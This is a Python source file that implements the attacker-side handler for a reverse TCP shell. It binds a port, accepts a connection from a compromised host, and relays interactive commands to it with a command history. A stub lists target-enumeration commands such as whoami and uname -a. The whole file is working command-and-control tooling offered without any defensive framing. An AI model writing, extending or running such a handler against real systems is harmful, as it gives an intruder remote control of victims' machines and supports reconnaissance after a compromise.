import socket
import queue
import threading

class ReverseTCPListener(threading.Thread):
	def __init__(self, handler):
		self.handler = handler
		self.is_listening = False

		super(ReverseTCPListener, self).__init__()
		self._stop_event = threading.Event()

	def run(self):
		self.is_listening = True
		try:
			while self.is_listening:
				try:
					data = self.handler.connection.recv(1024).decode()
					print("[+] received:\n\t{}".format(data))
					self.handler.command_buffer[0].append(data)
					self.handler.waiting_for_response = False
				except ConnectionResetError as cre:
					print("[-] connection reset by peer")
					self.handler.stop()
		except OSError as ose:
			pass
			# print("[!] connection is closed")

		# print("[-] terminating recv thread")
		return "kill me"

	def stop(self):
		# print("[-] stopping the listener")
		self.is_listening = False
		self._stop_event.set()

	def stopped(self):
		return self._stop_event.is_set()

class ReverseTCPHandler(threading.Thread):
	def __init__(self, host, port, loop_time=1.0/60):
		self.q = queue.Queue()
		self.timeout = loop_time
		super(ReverseTCPHandler, self).__init__()

		self.host = host
		self.port = int(port)
		self.connection = None
		self.socket = None
		self.command_buffer = []
		self.listener = None
		self.waiting_for_response = False
		self.handler_is_running = True

	def onThread(self, function, *args, **kwargs):
		self.q.put((function, args, kwargs))

	def enumerate_target(self):
		print(" [*] enumerating the target ...")
		enumeration_commands = [
			["whoami", ],
			["hostname", ],
			["uname -a",]
		]
		# need to set up proper queueing for command call and response handling

	def idle(self):
		pass

	def send_command(self, command_to_send):
		if command_to_send == "history":
			print("[*] command history:")
			for command in self.command_buffer[::-1]:
				print("\t[+] {}\t\t :\t\t{}".format(command[0], command[1]))
		elif command_to_send == "exit":
			print("[*] exiting interactive shell and closing remote connection")
			self.stop()
		else:
			print("[*] sending command: \'{}\'".format(command_to_send))
			self.waiting_for_response = True
			self.command_buffer.insert(0, [command_to_send])
			self.connection.send(bytes("{}\n".format(command_to_send), 'utf-8'))

	def has_connection(self):
		if self.connection is not None and not self.connection._closed:		# is there a better way than <conn>._closed?
			return True
		else:
			return False

	def run(self):
		# helps setup session
		self.waiting_for_response = True
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			self.socket.bind((self.host, self.port))
			print("[+] handler successfully bound to {}:{}".format(self.host, self.port))
		except:
			print("[-] error, address already in use")
			self.stop()
		self.socket.listen(1)
		self.connection, addr = self.socket.accept()
		print("[+] caught incoming connection from {}:{}".format(addr[0], addr[1]))
		self.waiting_for_response = False
		self.listener = ReverseTCPListener(self)
		self.listener.start()
		while self.handler_is_running:
			try:
				function, args, kwargs = self.q.get(timeout=self.timeout)
				function(*args, **kwargs)
			except:
				queue.Empty
				self.idle()

		# print("[-] joining recv thread to main thread")
		self.listener.stop()
		self.listener.join()
		# print("[-] recv thread joined")

	def stop(self, keyboard_killed=False):
		if keyboard_killed:
			print("\n[-] stopping the handler")
		else:
			print("[-] stopping the handler")
		self.handler_is_running = False
		self.connection.close()
		self.socket.close()
		if not self.listener.stopped:
			self.listener.stop()

		print("[*] handler stopped")
